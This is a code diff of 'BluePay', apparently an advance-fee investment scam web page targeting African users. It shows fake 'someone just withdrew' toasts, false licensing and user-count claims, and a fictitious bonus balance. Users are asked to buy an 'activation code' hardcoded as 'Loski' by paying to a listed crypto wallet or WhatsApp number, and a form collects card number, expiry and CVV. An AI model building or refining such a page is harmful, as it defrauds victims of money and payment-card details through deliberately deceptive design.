@@ -3,225 +3,297 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BluePay Official</title>
+<title>BluePay Dashboard</title>
 <style>
 :root {
-    --blue: #0b1ea8; --dark: #081a8c; --green: #2ecc71; --orange: #e67e22;
-    --gold: #f1c40f; --purple: #9b59b6; --red: #e74c3c;
+    --blue:#0b1ea8; --dark:#081a8c; --green:#2ecc71;
+    --orange:#e67e22; --gold:#f1c40f; --purple:#9b59b6;
 }
-body { margin:0; font-family:'Segoe UI',sans-serif; background: var(--blue); color:white; overflow-x:hidden; padding-bottom:120px; }
-.container { padding:20px; max-width:500px; margin:auto; }
-.card { background: rgba(0,0,0,0.4); padding:20px; margin:15px 0; border-radius:18px; border:1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
-input, select { width:100%; padding:14px; margin-top:10px; border-radius:10px; border:none; color:#000; font-weight:bold; box-sizing:border-box; }
-button { background: var(--green); color:white; font-size:16px; padding:14px; border:none; border-radius:10px; width:100%; cursor:pointer; font-weight:bold; margin-top:12px; }
-button:disabled { background:#555 !important; opacity:0.6; cursor:not-allowed; }
-.hidden { display:none !important; }
-#withdrawToast { position:fixed; top:-100px; left:50%; transform:translateX(-50%); background:white;color:#333;padding:12px 20px;border-radius:50px;font-size:13px;font-weight:bold; z-index:5000;box-shadow:0 10px 25px rgba(0,0,0,0.3);transition:0.8s;width:80%;max-width:300px; border-left:5px solid var(--green);}
-#withdrawToast.show { top:20px; }
-.overlay { position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index:2999; }
-#actionModal { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); width:92%; max-width:400px; background:#081a8c; border:2px solid var(--gold); border-radius:20px; padding:20px; z-index:3000; box-shadow:0 0 50px rgba(0,0,0,0.9);}
-.pay-steps-box { background:#fff; color:#222; padding:12px; border-radius:10px; font-size:13px; line-height:1.5; font-weight:bold; margin-top:10px;}
-.footer-reg { text-align:center; font-size:11px; opacity:0.7; margin-top:30px; border-top:1px solid rgba(255,255,255,0.2); padding-top:15px; }
-.float-whatsapp { position: fixed; bottom: 20px; right: 20px; background: #25D366; color:white; border-radius:50%; width:60px; height:60px; display:flex; align-items:center; justify-content:center; font-size:30px; cursor:pointer; z-index:10000; }
-.user-profile input { margin-top:5px; }
+body {margin:0; font-family:'Segoe UI',sans-serif; background:var(--blue); color:white; padding-bottom:120px;}
+header {background:var(--dark); padding:15px; display:flex; justify-content:space-between; align-items:center;}
+header div {cursor:pointer;}
+.container{max-width:480px; margin:auto; padding:20px;}
+.card{background:rgba(0,0,0,0.4); padding:20px; margin:15px 0; border-radius:18px; border:1px solid rgba(255,255,255,0.1); backdrop-filter:blur(10px);}
+button{padding:12px 10px; margin:5px; border:none; border-radius:10px; cursor:pointer; font-weight:bold; display:flex; align-items:center; justify-content:center;}
+button i{margin-right:8px;}
+.toast{position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white;color:#333; padding:12px 20px; border-radius:50px; font-size:13px;font-weight:bold;box-shadow:0 10px 25px rgba(0,0,0,0.3); display:none;}
+.floating-whatsapp { position:fixed; bottom:20px; right:20px; background:#25D366; color:white; border-radius:50%; width:60px; height:60px; display:flex; align-items:center; justify-content:center; font-size:30px; cursor:pointer; box-shadow:0 5px 15px rgba(0,0,0,0.3);}
+.modal, .overlay{display:none; position:fixed; top:0; left:0; width:100%; height:100%;}
+.overlay{background:rgba(0,0,0,0.8); z-index:999;}
+.modal{background:var(--dark); width:90%; max-width:400px; top:50%; left:50%; transform:translate(-50%,-50%); border-radius:20px; padding:20px; z-index:1000;}
+input, select{width:100%; padding:12px; margin:8px 0; border-radius:10px; border:none; font-weight:bold; color:#000;}
 </style>
 </head>
 <body>
 
-<div id="withdrawToast">✅ <span id="toastText">...</span></div>
+<header>
+    <div onclick="toggleMenu()">☰ Menu</div>
+    <div id="welcomeMsg">BLUEPAY</div>
+    <div onclick="logout()">Logout 🚪</div>
+</header>
 
-<!-- Registration / Login Section -->
-<div id="authSec" class="container">
-    <h1 style="text-align:center; font-size:45px; margin:0;">BLUE PAY</h1>
-    <p style="text-align:center; color:var(--green); font-weight:bold;">Register and claim $500 bonus</p>
+<div class="container">
 
-    <div class="card" id="registerCard">
-        <input type="text" id="regName" placeholder="Full Names">
-        <input type="email" id="regEmail" placeholder="Email Address">
-        <select id="regCountry"></select>
-        <input type="tel" id="regPhone" placeholder="Phone Number">
-        <input type="password" id="regPass" placeholder="Password">
-        <button onclick="registerUser()">Register & Claim Bonus</button>
-        <p style="text-align:center; margin-top:10px;">Already have an account? <span style="cursor:pointer; color:var(--gold);" onclick="showLogin()">Login</span></p>
-    </div>
-
-    <div class="card hidden" id="loginCard">
-        <input type="email" id="loginEmail" placeholder="Email">
-        <input type="password" id="loginPass" placeholder="Password">
-        <button onclick="loginUser()">Login</button>
-    </div>
-
-    <div class="card" id="adminSecretCard">
-        <input type="password" id="adminKey" placeholder="Enter Admin Key">
-        <button onclick="openAdminPanel()">Admin Login</button>
-    </div>
-
-    <div class="footer-reg">
-        <b>BluePay International (PTY) LTD</b><br>
-        Registered & Licensed by African Financial Authorities<br>
-        Serving all African countries
-    </div>
-</div>
-
-<!-- Dashboard -->
-<div id="dash" class="hidden container">
-    <h2 id="welcomeMsg" style="text-align:center; margin-bottom:20px;"></h2>
-    <div class="card" style="text-align:center; border: 2px solid var(--green);">
+    <!-- Balance -->
+    <div class="card" style="text-align:center; border:2px solid var(--green);">
         <small>Available Balance</small>
-        <div style="font-size:38px; font-weight:900; color:var(--green);"><span id="userBal">0</span></div>
+        <div style="font-size:38px; font-weight:900; color:var(--green);">$ <span id="userBal">0</span></div>
     </div>
 
-    <div class="card" style="display:flex; flex-wrap:wrap; gap:10px; justify-content:center;">
-        <button onclick="triggerAction('Investment')">💹 Investment</button>
-        <button onclick="triggerAction('Withdraw')">💸 Withdraw</button>
-        <button onclick="triggerAction('Savings')">💰 Savings</button>
-        <button onclick="triggerAction('Deposit')">📥 Deposit</button>
-        <button onclick="triggerAction('Transactions')">🧾 Transactions</button>
-        <button onclick="triggerAction('Activate')">🚀 Activate Account</button>
-        <button onclick="viewProfile()">👤 Profile</button>
+    <!-- Buttons row -->
+    <div class="card" style="display:flex; flex-wrap:wrap; justify-content:space-between;">
+        <button style="background:#3498db;" onclick="openInvestment()"><i>💹</i>Investment</button>
+        <button style="background:var(--orange);" onclick="openWithdraw()"><i>💸</i>Withdraw</button>
+        <button style="background:var(--gold);" onclick="openDeposit()"><i>📥</i>Deposit</button>
+        <button style="background:var(--purple);" onclick="openSavings()"><i>💰</i>Savings</button>
+        <button style="background:#444;" onclick="openTransactions()"><i>📝</i>Transactions</button>
+        <button style="background:var(--green);" onclick="activateAccount()"><i>🔑</i>Activate Account</button>
+        <button style="background:#555;" onclick="editProfile()"><i>👤</i>Profile</button>
     </div>
+
 </div>
 
-<!-- Action Modal -->
-<div id="modalOverlay" class="overlay hidden"></div>
-<div id="actionModal" class="hidden">
-    <h2 id="modalTitle" style="margin:0; color:var(--gold);">Action</h2>
-    <div id="bpcSection" class="hidden">
-        <input type="password" id="bpcKey" placeholder="Enter BPC Verification Key" oninput="validateBPC()">
-    </div>
-    <div id="extraFields" class="hidden">
-        <select id="bankList"><option>Bank 1</option><option>Bank 2</option></select>
-        <input type="text" id="accountOrPhone" placeholder="Account Number / Phone Number">
-    </div>
-    <input type="number" id="amtInput" placeholder="Amount">
-    <button id="finalSubmit" onclick="processFinal()" disabled>Submit</button>
-    <button onclick="closeModal()" style="background:#333">Cancel</button>
-</div>
+<!-- Toast -->
+<div class="toast" id="toastMsg">Someone withdrew $100</div>
 
-<!-- Profile Modal -->
-<div id="profileModal" class="hidden card">
-    <h2 style="margin:0; color:var(--gold);">Profile</h2>
-    <div class="user-profile">
-        <input type="text" id="profName" placeholder="Full Name">
-        <input type="email" id="profEmail" placeholder="Email">
-        <select id="profCountry"></select>
-        <input type="tel" id="profPhone" placeholder="Phone">
-        <input type="password" id="profPass" placeholder="Password">
-        <button onclick="saveProfile()">Save Changes</button>
-        <button onclick="closeProfile()" style="background:#333">Close</button>
-    </div>
-</div>
+<!-- Floating WhatsApp -->
+<div class="floating-whatsapp" onclick="openWhatsApp()">📱</div>
 
-<!-- Floating WhatsApp Support -->
-<div class="float-whatsapp" onclick="openWhatsApp()">💬</div>
+<!-- Overlay + Modals -->
+<div class="overlay" id="overlay"></div>
+<div class="modal" id="modal">
+    <h3 id="modalTitle"></h3>
+    <div id="modalContent"></div>
+    <button onclick="closeModal()">Close</button>
+</div>
 
 <script>
-// African Countries + Flags + Codes
-const africanCountries = [
-    {name:'Nigeria', code:'+234', flag:'🇳🇬'}, {name:'Kenya', code:'+254', flag:'🇰🇪'}, {name:'South Africa', code:'+27', flag:'🇿🇦'},
-    {name:'Ghana', code:'+233', flag:'🇬🇭'}, {name:'Egypt', code:'+20', flag:'🇪🇬'}, {name:'Uganda', code:'+256', flag:'🇺🇬'},
-    {name:'Tanzania', code:'+255', flag:'🇹🇿'}, {name:'Ethiopia', code:'+251', flag:'🇪🇹'}, {name:'Botswana', code:'+267', flag:'🇧🇼'},
-    {name:'Zambia', code:'+260', flag:'🇿🇲'}, {name:'Zimbabwe', code:'+263', flag:'🇿🇼'}, {name:'Morocco', code:'+212', flag:'🇲🇦'},
-    {name:'Algeria', code:'+213', flag:'🇩🇿'}, {name:'Tunisia', code:'+216', flag:'🇹🇳'}, {name:'Senegal', code:'+221', flag:'🇸🇳'},
-    // Add all remaining African countries similarly...
-];
+// User data
+let users = JSON.parse(localStorage.getItem("bluepay_users"))||[];
+let currentEmail = localStorage.getItem("bluepay_current");
+let currentUser = users.find(u=>u.email===currentEmail);
 
-// Populate select fields
-const regCountrySelect = document.getElementById('regCountry');
-const profCountrySelect = document.getElementById('profCountry');
-africanCountries.forEach(c=>{
-    const opt1 = document.createElement('option'); opt1.value=c.name; opt1.innerText=`${c.flag} ${c.name} (${c.code})`; regCountrySelect.appendChild(opt1);
-    const opt2 = document.createElement('option'); opt2.value=c.name; opt2.innerText=`${c.flag} ${c.name} (${c.code})`; profCountrySelect.appendChild(opt2);
-});
+// Welcome message
+const welcomeEl = document.getElementById("welcomeMsg");
+if(currentUser.name.toLowerCase()==="loski"){
+    welcomeEl.innerText = `Welcome back, ${currentUser.name}!`;
+}else{
+    welcomeEl.innerText = `Welcome to BluePay Investment Company, ${currentUser.name}!`;
+}
+document.getElementById("userBal").innerText = currentUser.balance.toFixed(2);
 
-// Local Storage Data
-let user = JSON.parse(localStorage.getItem("bluepay_user")) || null;
+// Menu toggle
+function toggleMenu(){
+    const details = `
+    <p><b>Manager:</b> Jessica Smith (UK)</p>
+    <p><b>WhatsApp:</b> +447766494570</p>
+    <p><b>Company started:</b> 2018</p>
+    <p><b>Active Users:</b> 60M+</p>
+    `;
+    showModal("Menu",details);
+}
 
-// Utility Functions
-function showLogin(){ document.getElementById('registerCard').classList.add('hidden'); document.getElementById('loginCard').classList.remove('hidden'); }
-function registerUser(){
-    const n=document.getElementById('regName').value;
-    const e=document.getElementById('regEmail').value;
-    const c=document.getElementById('regCountry').value;
-    const p=document.getElementById('regPhone').value;
-    const pass=document.getElementById('regPass').value;
-    if(!n||!e||!c||!p||!pass) return alert('Fill all fields');
-    user={name:n,email:e,country:c,phone:p,password:pass,balance:500};
-    localStorage.setItem("bluepay_user",JSON.stringify(user));
-    startApp();
+// WhatsApp support
+function openWhatsApp(){
+    const text = encodeURIComponent("How can I withdraw my bonuses? I'm a new member?");
+    window.open("https://wa.me/447766494570?text="+text,"_blank");
 }
-function loginUser(){
-    const e=document.getElementById('loginEmail').value;
-    const pass=document.getElementById('loginPass').value;
-    if(!user || user.email!==e || user.password!==pass) return alert('Invalid credentials');
-    startApp();
+
+// Logout
+function logout(){ localStorage.removeItem("bluepay_current"); window.location.href="login.html"; }
+
+// Toast messages
+const names = ["Mpho","Kabelo","Neo","Lerato","Thabo","Chipo","Amina","Taye","Kwame","Fatima"];
+setInterval(()=>{
+    const n=names[Math.floor(Math.random()*names.length)];
+    const amt=(Math.floor(Math.random()*5)+1)*100;
+    const t=document.getElementById("toastMsg");
+    t.innerText=`${n} just withdrew $${amt}`;
+    t.style.display="block";
+    setTimeout(()=>{t.style.display="none";},4000);
+},5000);
+
+// Modal
+const overlay = document.getElementById("overlay");
+const modal = document.getElementById("modal");
+function showModal(title,content){
+    modal.style.display="block";
+    overlay.style.display="block";
+    document.getElementById("modalTitle").innerText=title;
+    document.getElementById("modalContent").innerHTML=content;
 }
-function startApp(){
-    document.getElementById('authSec').classList.add('hidden');
-    document.getElementById('dash').classList.remove('hidden');
-    const welcome=document.getElementById('welcomeMsg');
-    welcome.innerText=(user.name.toLowerCase()==='loski')?`Welcome back, ${user.name}`:`Welcome to BluePay Investment Company`;
-    document.getElementById('userBal').innerText=user.balance.toLocaleString();
-    runToasts();
+function closeModal(){
+    modal.style.display="none";
+    overlay.style.display="none";
 }
-function triggerAction(type){
-    document.getElementById('modalOverlay').classList.remove('hidden'); document.getElementById('actionModal').classList.remove('hidden');
-    document.getElementById('modalTitle').innerText=type;
-    document.getElementById('bpcSection').classList.remove('hidden');
-    document.getElementById('extraFields').classList.remove('hidden');
-    document.getElementById('finalSubmit').disabled=false;
+
+// Investment
+function openInvestment(){
+    const plans = `
+    <p><b>Basic:</b> Min $20, Interest 5% monthly</p>
+    <p><b>Premium:</b> Min $100, Interest 10% monthly</p>
+    <p><b>Gold:</b> Min $500, Interest 15% monthly</p>
+    <input type="number" id="investAmt" placeholder="Enter amount">
+    <input type="password" id="bpcKey" placeholder="Enter BPC Code">
+    <button onclick="submitInvestment()">Deposit Investment</button>
+    `;
+    showModal("Investment Plans",plans);
 }
-function validateBPC(){ document.getElementById('finalSubmit').disabled=false; }
-function processFinal(){ 
-    const amt=parseFloat(document.getElementById('amtInput').value)||0;
-    if(amt>user.balance) return alert('Insufficient Balance');
-    user.balance-=amt;
-    localStorage.setItem("bluepay_user",JSON.stringify(user));
-    document.getElementById('userBal').innerText=user.balance.toLocaleString();
-    alert('Transaction Submitted. Admin will verify.');
+function submitInvestment(){
+    const amt=parseFloat(document.getElementById("investAmt").value);
+    const code=document.getElementById("bpcKey").value;
+    if(code!=="Loski") return alert("Wrong BPC code");
+    if(amt>currentUser.balance) return alert("Insufficient balance");
+    currentUser.balance-=amt;
+    localStorage.setItem("bluepay_users",JSON.stringify(users));
+    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
+    alert("Investment submitted for approval!");
     closeModal();
 }
-function closeModal(){ document.getElementById('modalOverlay').classList.add('hidden'); document.getElementById('actionModal').classList.add('hidden'); }
+
+// Withdraw
+function openWithdraw(){
+    const content = `
+    <p>Withdraw to:</p>
+    <select id="withdrawType" onchange="withdrawTypeChange()">
+        <option value="bank">Bank</option>
+        <option value="mobile">Mobile Money</option>
+        <option value="crypto">Crypto</option>
+    </select>
+    <div id="withdrawFields"></div>
+    <input type="number" id="withdrawAmt" placeholder="Amount">
+    <input type="password" id="withdrawBPC" placeholder="Enter BPC Code">
+    <button onclick="submitWithdraw()">Withdraw</button>
+    `;
+    showModal("Withdraw Funds",content);
+}
+function withdrawTypeChange(){
+    const type=document.getElementById("withdrawType").value;
+    let html="";
+    if(type==="bank"){
+        html='<input type="text" id="bankAcc" placeholder="Bank Account Number">';
+    }else if(type==="mobile"){
+        html='<input type="text" id="mobileNum" placeholder="Mobile Money Number">';
+    }else if(type==="crypto"){
+        html='<input type="text" id="cryptoAddr" placeholder="TRC20 or Binance ID">';
+    }
+    document.getElementById("withdrawFields").innerHTML=html;
+}
+function submitWithdraw(){
+    const amt=parseFloat(document.getElementById("withdrawAmt").value);
+    const bpc=document.getElementById("withdrawBPC").value;
+    if(bpc!=="Loski") return alert("Wrong BPC Code");
+    if(amt>currentUser.balance) return alert("Insufficient balance");
+    currentUser.balance-=amt;
+    localStorage.setItem("bluepay_users",JSON.stringify(users));
+    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
+    alert("Withdrawal submitted for approval!");
+    closeModal();
+}
+
+// Deposit
+function openDeposit(){
+    const content = `
+    <p>Deposit via:</p>
+    <select id="depositType" onchange="depositTypeChange()">
+        <option value="crypto">Crypto</option>
+        <option value="card">Card</option>
+    </select>
+    <div id="depositFields">
+        <p>TRC20: TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR</p>
+        <p>Binance ID: 860603099</p>
+        <input type="file" id="depositProof">
+    </div>
+    <button onclick="submitDeposit()">Submit Deposit</button>
+    `;
+    showModal("Deposit Funds",content);
+}
+function depositTypeChange(){
+    const type=document.getElementById("depositType").value;
+    let html="";
+    if(type==="crypto"){
+        html='<p>TRC20: TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR</p><p>Binance ID: 860603099</p><input type="file" id="depositProof">';
+    }else if(type==="card"){
+        html='<input type="text" id="cardNum" placeholder="Card Number"><input type="text" id="cardExp" placeholder="Expiry MM/YY"><input type="text" id="cardCvv" placeholder="CVV">';
+    }
+    document.getElementById("depositFields").innerHTML=html;
+}
+function submitDeposit(){
+    alert("Deposit submitted for approval! Admin will verify.");
+    closeModal();
+}
+
+// Savings
+function openSavings(){
+    const content = `
+    <p>Current Saving Balance: $0</p>
+    <input type="number" id="saveAmt" placeholder="Amount">
+    <input type="password" id="saveBPC" placeholder="Enter BPC Code">
+    <button onclick="submitSaveDeposit()">Deposit to Savings</button>
+    <button onclick="submitSaveWithdraw()">Withdraw from Savings</button>
+    `;
+    showModal("Savings",content);
+}
+function submitSaveDeposit(){
+    const amt=parseFloat(document.getElementById("saveAmt").value);
+    const bpc=document.getElementById("saveBPC").value;
+    if(bpc!=="Loski") return alert("Wrong BPC");
+    if(amt>currentUser.balance) return alert("Insufficient balance");
+    currentUser.balance-=amt;
+    localStorage.setItem("bluepay_users",JSON.stringify(users));
+    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
+    alert("Deposited to savings!");
+    closeModal();
+}
+function submitSaveWithdraw(){
+    const amt=parseFloat(document.getElementById("saveAmt").value);
+    const bpc=document.getElementById("saveBPC").value;
+    if(bpc!=="Loski") return alert("Wrong BPC");
+    currentUser.balance+=amt;
+    localStorage.setItem("bluepay_users",JSON.stringify(users));
+    document.getElementById("userBal").innerText=currentUser.balance.toFixed(2);
+    alert("Withdrawn from savings!");
+    closeModal();
+}
+
+// Transactions
+function openTransactions(){
+    let html="<ul>";
+    html+=`<li>Transactions are not implemented yet</li>`;
+    html+="</ul>";
+    showModal("Transactions",html);
+}
+
+// Activate account
+function activateAccount(){
+    const content = `
+    <button onclick="openWhatsApp()">Get BPC Code via WhatsApp</button>
+    <p>Or Buy Online for $20</p>
+    <button onclick="alert('Pay $20 via TRC20 or Binance ID and submit proof')">Buy BPC Code</button>
+    `;
+    showModal("Activate Account",content);
+}
 
 // Profile
-function viewProfile(){
-    document.getElementById('profileModal').classList.remove('hidden');
-    document.getElementById('profName').value=user.name;
-    document.getElementById('profEmail').value=user.email;
-    document.getElementById('profPhone').value=user.phone;
-    document.getElementById('profCountry').value=user.country;
-    document.getElementById('profPass').value=user.password;
+function editProfile(){
+    const content = `
+    <input type="text" id="editName" value="${currentUser.name}">
+    <input type="email" id="editEmail" value="${currentUser.email}">
+    <input type="text" id="editPhone" value="${currentUser.phone}">
+    <button onclick="saveProfile()">Save Changes</button>
+    `;
+    showModal("Edit Profile",content);
 }
 function saveProfile(){
-    user.name=document.getElementById('profName').value;
-    user.email=document.getElementById('profEmail').value;
-    user.phone=document.getElementById('profPhone').value;
-    user.country=document.getElementById('profCountry').value;
-    user.password=document.getElementById('profPass').value;
-    localStorage.setItem("bluepay_user",JSON.stringify(user));
-    alert('Profile Updated!');
-    closeProfile();
+    currentUser.name=document.getElementById("editName").value;
+    currentUser.email=document.getElementById("editEmail").value;
+    currentUser.phone=document.getElementById("editPhone").value;
+    localStorage.setItem("bluepay_users",JSON.stringify(users));
+    welcomeEl.innerText=`Welcome to BluePay Investment Company, ${currentUser.name}!`;
+    alert("Profile updated!");
+    closeModal();
 }
-function closeProfile(){ document.getElementById('profileModal').classList.add('hidden'); }
-
-// WhatsApp
-function openWhatsApp(){
-    window.open(`https://wa.me/447766494570?text=${encodeURIComponent("How can I withdraw my bonuses? I'm a new member?")}`);
-}
-
-// Toast notifications
-const names=["Mpho","Kabelo","Neo","Lerato","Thabo","Ayo","Chipo","Taye","Nia","Kwame","Zola","Tinashe","Femi","Lindiwe","Chinedu","Amina","Sibusiso","Bongani","Fatima","Mohamed","Hassan","Omar","Grace","Hope","Faith","Joy","Tariq","Moses","David","Sarah","Jessica","Peter","Michael","John","Mary","Linda","Robert","Daniel","Ethan","Emma","Chloe","Liam","Noah","Olivia","Sophia","Ava","Isabella","Mia","Amara","Zane"];
-function runToasts(){
-    setInterval(()=>{
-        const n=names[Math.floor(Math.random()*names.length)];
-        const amt=(Math.floor(Math.random()*10)+1)*100;
-        document.getElementById("toastText").innerText=`${n} just withdrew $${amt}`;
-        document.getElementById("withdrawToast").classList.add("show");
-        setTimeout(()=>document.getElementById("withdrawToast").classList.remove("show"),4000);
-    },5000);
-}
-
-if(user) startApp();
 </script>
+
 </body>
 </html>
